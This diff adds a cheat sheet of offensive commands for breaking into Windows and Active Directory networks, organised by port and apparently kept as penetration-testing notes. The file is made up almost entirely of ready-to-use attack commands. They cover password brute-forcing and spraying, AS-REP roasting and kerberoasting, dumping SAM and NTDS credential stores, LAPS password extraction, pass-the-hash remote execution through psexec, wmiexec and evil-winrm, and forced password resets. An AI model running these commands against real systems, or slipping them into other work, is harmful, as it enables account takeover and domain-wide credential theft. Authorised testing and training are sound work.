@@ -1,0 +1,69 @@
+### Port 22 (SSH)
+ssh $user@$rhost #22
+ssh $user@$rhost -i id_rsa #22
+
+### Port 21 (FTP)
+ftp $user@$rhost #21
+
+### Port 53 (DNS)
+bloodhound-python -d $domain -u $user -p '$password' -c All #53
+bloodhound-python -d $domain -u $user -p '$password' -dc $computer_name.$domain --disable-autogc -c all #53
+bloodhound-python -d $domain -u $user -p '$password' -ns 192.168.1.5 --disable-autogc -c all #53
+
+### Port 80 (HTTP)
+hydra -L /seclists/Usernames/Names/names.txt -p $password -u -f $rhost -s 43649 http-get / #80
+
+### Port 88 (Kerberos)
+impacket-GetNPUsers $domain/$user #88
+impacket-GetNPUsers -request -dc-ip $rhost $domain/$user -outputfile $user-hash.asrep #88
+impacket-GetUserSPNs -request -dc-ip $rhost $domain/$user #88
+kerbrute passwordspray -d $shortdomain --dc $rhost users.txt $password #88
+impacket-secretsdump $shortdomain/$user@$rhost #445 88
+
+### Port 135 139 (RPC)
+rpcclient -U "$domain/$user%$password" $rhost
+rpcclient -U $domain/$user $rhost
+
+### Port 389 (LDAP)
+Edit> ldapsearch -v -x -D $user@$domain -w $password -b "DC=$shortdomain,DC=c0mmm" -H "ldap://$rhost" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd #389
+Run via Venv> python pyLAPS.py --action get -d "$domain" -u $user -p "$password" --dc-ip $rhost #389
+
+### Port 445 (SMB)
+smbclient -L //$rhost/ -U $domain/$user #445
+nxc smb $rhost -u '$user' -p '$password' --users #445
+impacket-wmiexec administrator@$rhost -hashes Hash-value #445
+impacket-secretsdump $shortdomain/$user@$rhost #445
+smbpasswd -r $rhost -U $user #445
+impacket-psexec LADMIN@$rhost #445
+impacket-psexec administrator@$rhost -hashes :Hash-value #445
+impacket-smbexec administrator@$rhost -hashes :Hash-value #445
+crackmapexec smb $rhost -u Administrator -H Hash-value #445
+crackmapexec smb $rhost -u users.txt -p passwords.txt -d $domain --continue-on-success #445
+crackmapexec smb 192.168.1.0/24 -u administrator -p '$password' --loggedon-users #445
+crackmapexec smb $rhost -u administrator -p '$password' --sam #445
+crackmapexec smb $rhost -u Administrator -p '$password' -x 'whoami' --exec-method smbexec #445
+impacket-psexec $shortdomain/$user@$rhost #445
+impacket-psexec -hashes :hash-here $shortdomain/$user@$rhost #445
+Try> impacket-secretsdump -ntds AD-stolen/ntds.dit -system reg-stolen/SYSTEM LOCAL
+Try> impacket-secretsdump -ntds AD-stolen/ntds.dit -system SYSTEM LOCAL
+net rpc password "TargetUser" "NewP@ssw0rd" -U "contoso"/"pwned-user"%"St0ng123" -S "DC-IP-Here"
+net rpc password "TargetUser" -U "contoso"/"pwned-user"%"St0ng123" -S "DC-IP-Here"
+
+### Port 1433 (MSSQL)
+mssqlclient -p 1433 $shortdomain/$user:$password@$rhost #1433
+mssqlclient -p 1433 $user:$password@$rhost -windows-auth #1433
+mssqlclient -p 1433 $user@$rhost -windows-auth #1433
+mssqlclient -p 1433 -hashes LMHASH:NTHASH $shortdomain/$user:$password@192.168.1.5 #1433
+
+### Port 3306 (MySQL)
+mysql -h $rhost -u $user #3306
+mysql -h $rhost -u root #3306
+
+### Port 5985 (WinRM)
+evil-winrm -i $rhost -u $user -p $password #5985
+evil-winrm -i $rhost -u $user -H Hash-value #5985
+crackmapexec winrm $rhost -u users.txt -H hashes.txt --continue-on-success #5985
+evil-winrm -i $rhost -u $user -H '19a3a7550ce8c505c2d4608' #5985
+
+### Port 6379 (Redis)
+redis-cli -user $user -a $password -h $rhost #6379
